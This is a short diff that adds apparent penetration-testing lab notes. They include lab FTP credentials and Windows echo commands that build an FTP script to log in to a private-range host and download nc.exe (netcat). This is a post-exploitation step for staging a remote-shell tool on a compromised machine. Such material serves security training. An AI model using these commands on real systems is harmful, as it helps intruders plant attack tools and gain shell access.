@@ -1,0 +1,11 @@
+# Username: offsecuser
+# Password: test1234
+# Server restart: /etc/init.d/pure-ftpd restart 
+
+echo open 10.11.0.187 21> ftp.txt
+echo USER offsecuser>> ftp.txt
+echo test1234>> ftp.txt
+echo bin >> ftp.txt
+echo GET nc.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -v -n -s:ftp.txt
